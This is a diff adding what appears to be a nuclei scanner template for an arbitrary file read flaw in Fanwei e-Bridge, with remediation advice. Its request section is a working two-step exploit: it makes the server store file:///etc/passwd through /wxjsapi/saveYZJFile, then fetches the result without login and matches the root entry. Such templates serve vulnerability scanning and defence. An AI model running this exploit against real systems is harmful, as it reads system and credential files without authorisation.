@@ -1,0 +1,44 @@
+id: E_bridge-lfi-saveYZJFile
+info:
+  name: Fanwei e-Bridge Arbitrary File Read
+  author:
+  - 折跃
+  description: |-
+    Fanwei Cloud Bridge e-Bridge Arbitrary File Read Vulnerability
+    Fanwei Cloud Bridge (e-Bridge) is a system integration middleware developed by Shanghai Fanwei under the "Internet+" background, used to bridge open Internet resources with enterprise information systems.
+
+    An arbitrary file read vulnerability exists in Fanwei E-office. An attacker can exploit it to read arbitrary files.
+  severity: medium
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.weaver.com.cn/
+
+    Temporary remediation:
+    1. Filter "." so that users cannot navigate to parent directories from URLs.
+    2. Strictly validate the format of user input parameters with regular expressions, hardcode or uniformly encode the filename parameters passed by users, whitelist file types, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and allow users to download files by submitting the corresponding file ID.
+    5. Verify user permissions before file downloads.
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code_2==200
+    - contains(body_2,'root:x:0:0:root:/root:/bin/bash')
+  extractors:
+  - name: bannar
+    type: regex
+    regex:
+    - extension":"txt","id":"(.+)","createtime
+    group: 1
+    part: body
+    internal: true
+  path:
+  - '{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
+  - '{{BaseURL}}/file/fileNoLogin/{{bannar}}'
+  method: GET
+  headers:
+    Host: '{{Hostname}}'
+  req-condition: true
